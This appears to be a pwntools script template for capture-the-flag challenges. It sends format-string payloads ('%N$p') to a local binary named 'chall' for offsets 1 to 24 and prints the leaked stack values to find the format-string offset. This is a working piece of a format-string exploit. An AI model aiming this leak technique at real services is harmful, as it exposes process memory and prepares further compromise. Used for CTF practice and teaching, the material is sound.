from pwn import *

context.binary = binary = ELF('./chall') #Change the binary file.
context.log_level = 'error'

for i in range(1, 25): # Change the range according to your need
    p = process(binary.path)

    payload = f"%{i}$p".encode() #You can also find the offset by using AAAAAAAA.%{i}$p

    p.recvuntil(b'Enter your input here:')# Change according to the need
    p.sendline(payload)
    p.recvuntil(b'You inputed:')# Change according to the need
    p.recvline()
    leak = p.recvline().strip()

    print(f"{i}: {leak.decode()}")

    p.close()

